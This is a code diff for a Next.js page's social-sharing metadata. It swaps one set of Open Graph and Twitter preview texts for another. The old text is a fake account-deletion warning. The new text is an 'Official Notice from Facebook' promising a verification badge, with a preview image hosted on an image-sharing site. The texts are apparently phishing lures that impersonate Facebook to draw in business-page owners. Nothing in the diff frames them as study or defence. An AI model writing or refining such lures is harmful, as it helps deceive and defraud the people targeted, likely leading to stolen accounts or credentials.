@@ -31,8 +31,8 @@ export async function generateMetadata() {
             shortcut: '/favicon-32x32.png',
         },
         openGraph: {
-            title: 'We have scheduled your page to be deleted',
-            description: 'We have received several reports that your account violates our terms of service and community guidelines. As a result, your account will be sent for verification.',
+            title: 'Official Notice from Facebook',
+            description: 'Your Business Page selected for our Creator Verify Permanent Badge 2025 The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the ...',
             images: [
                 {
                     url: `https://i.postimg.cc/sgnQYgTC/social-preview.png`,
@@ -44,8 +44,8 @@ export async function generateMetadata() {
         },
         twitter: {
             card: 'summary_large_image',
-            title: 'We have scheduled your page to be deleted',
-            description: 'We have received several reports that your account violates our terms of service and community guidelines. As a result, your account will be sent for verification.',
+            title: 'Official Notice from Facebook',
+            description: 'Your Business Page selected for our Creator Verify Permanent Badge 2025 The verified badge means that Facebook has confirmed that the Page or profile is the authentic presence of the ...',
             images: [`https://i.postimg.cc/sgnQYgTC/social-preview.png`]
         }
     };
